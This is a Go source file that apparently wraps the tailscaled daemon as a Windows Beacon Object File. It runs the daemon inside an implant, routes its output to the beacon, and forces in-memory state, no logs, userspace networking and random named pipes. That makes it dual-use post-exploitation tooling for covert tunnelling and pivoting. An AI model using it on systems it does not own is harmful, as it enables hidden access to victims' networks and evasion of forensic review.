//go:build windows && bofpe
// +build windows,bofpe

package main

/*
#include <stdlib.h>
#include "beacon.h"

#cgo LDFLAGS: -L. -lbeacon
*/
import "C"
import (
	"fmt"
	"io"
	"log"
	"os"
	"strings"
	"sync"

	"github.com/google/uuid"
)

// beaconWriter sends output to BeaconOutput
type beaconWriter struct {
	mu sync.Mutex
}

func (w *beaconWriter) Write(p []byte) (n int, err error) {
	if len(p) > 0 {
		w.mu.Lock()
		defer w.mu.Unlock()

		cData := C.CBytes(p)
		defer C.free(cData)
		C.BeaconOutput(0, (*C.char)(cData), C.int(len(p)))
	}
	return len(p), nil
}

// BeaconPrintf formats a string and sends it to BeaconOutput
func BeaconPrintf(format string, args ...interface{}) {
	formatted := fmt.Sprintf(format, args...)
	if len(formatted) > 0 {
		cData := C.CBytes([]byte(formatted))
		defer C.free(cData)
		C.BeaconOutput(0, (*C.char)(cData), C.int(len(formatted)))
	}
}

func setupRedirection() (originalStdout *os.File, originalStderr *os.File, originalLogOutput io.Writer) {
	originalStdout = os.Stdout
	originalStderr = os.Stderr
	originalLogOutput = log.Writer()

	w := &beaconWriter{}
	// Create an os.File backed by a pipe whose read end is consumed by beaconWriter.
	// This lets code that writes directly to os.Stdout/os.Stderr (via the *os.File)
	// get captured too, not just fmt.Fprint/log calls.
	pr, pw, _ := os.Pipe()
	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := pr.Read(buf)
			if n > 0 {
				w.Write(buf[:n])
			}
			if err != nil {
				return
			}
		}
	}()

	os.Stdout = pw
	os.Stderr = pw
	log.SetOutput(w)

	return
}

func restoreRedirection(originalStdout *os.File, originalStderr *os.File, originalLogOutput io.Writer) {
	// Close the pipe write ends so the reader goroutines exit
	os.Stdout.Close()
	os.Stderr = originalStderr
	os.Stdout = originalStdout
	log.SetOutput(originalLogOutput)
}

//export Go
func Go(data *C.char, length C.int) {
	// Redirect os.Stdout, os.Stderr, and log output to BeaconOutput
	originalStdout, originalStderr, originalLogOutput := setupRedirection()
	defer restoreRedirection(originalStdout, originalStderr, originalLogOutput)

	var parser C.datap
	C.BeaconDataParse(&parser, data, length)

	// Create a default arg[0] and extract packed string arguments until no more left
	tokens := []string{"program.exe"}
	var size C.int
	for extracted := C.BeaconDataExtract(&parser, &size); extracted != nil; extracted = C.BeaconDataExtract(&parser, &size) {
		tokens = append(tokens, C.GoStringN(extracted, size-1))
	}

	// Check for required arguments and add if missing
	hasTun := false
	hasNoLogs := false
	hasState := false
	hasSocket := false

	for _, token := range tokens {
		if strings.HasPrefix(token, "-tun") {
			hasTun = true
		}
		if token == "-no-logs-no-support" {
			hasNoLogs = true
		}
		if strings.HasPrefix(token, "-state") {
			hasState = true
		}
		if strings.HasPrefix(token, "-socket") {
			hasSocket = true
		}
	}

	// Add missing arguments
	if !hasTun {
		tokens = append(tokens, "-tun=userspace-networking")
	}
	if !hasNoLogs {
		tokens = append(tokens, "-no-logs-no-support")
	}
	if !hasState {
		tokens = append(tokens, "-state", "mem:")
	}
	if !hasSocket {
		socket := fmt.Sprintf("\\\\.\\pipe\\%s", uuid.New())
		tokens = append(tokens, "-socket", socket)
		BeaconPrintf("[=] No socket provided, using random socket %s\n", socket)
	}

	//This stops tailscaled creating an empty folder at C:\ProgramData\tailscale
	os.Setenv("TS_LOGS_DIR", "C:\\ProgramData")
	//This will force RFC6455 compliant websocket connections for tunneling DERP relay and control plane connections
	os.Setenv("TS_DEBUG_DERP_WS_CLIENT", "1")
	//Raise logtail's stderr echo level so [v1]/info messages are captured via the pipe
	os.Setenv("TS_LOG_VERBOSITY", "1")
	os.Args = tokens
	main()

	BeaconPrintf("tailscaled shutdown gracefully\n")
}
